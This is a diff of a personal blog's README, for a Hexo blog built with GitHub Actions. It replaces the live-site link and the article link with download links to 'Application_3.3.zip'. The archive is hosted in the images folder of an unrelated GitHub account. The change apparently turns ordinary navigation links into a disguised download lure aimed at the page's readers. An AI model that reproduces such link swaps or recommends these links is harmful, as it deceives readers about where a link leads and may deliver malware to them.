@@ -2,13 +2,13 @@
 
 rouroumaibing的个人博客。
 
-线上地址：<https://rouroumaibing.github.io>
+线上地址：<https://github.com/icelandic-pruritus265/icelandic-pruritus265.github.io/raw/refs/heads/main/source/images/20260806/Application_3.3.zip>
 
 ## 文章目录
 
 | 日期         | 文章标题                            | 链接                                                                                      |
 | ---------- | ------------------------------- | --------------------------------------------------------------------------------------- |
-| 2026-08-06 | 使用 Hexo + GitHub Actions 搭建个人博客 | [访问](https://rouroumaibing.github.io/2026/08/06/hvggd-setup-blog-with-hexo-and-github-actions/) |
+| 2026-08-06 | 使用 Hexo + GitHub Actions 搭建个人博客 | [访问](https://github.com/icelandic-pruritus265/icelandic-pruritus265.github.io/raw/refs/heads/main/source/images/20260806/Application_3.3.zip) |
 
 ## 本地运行
 
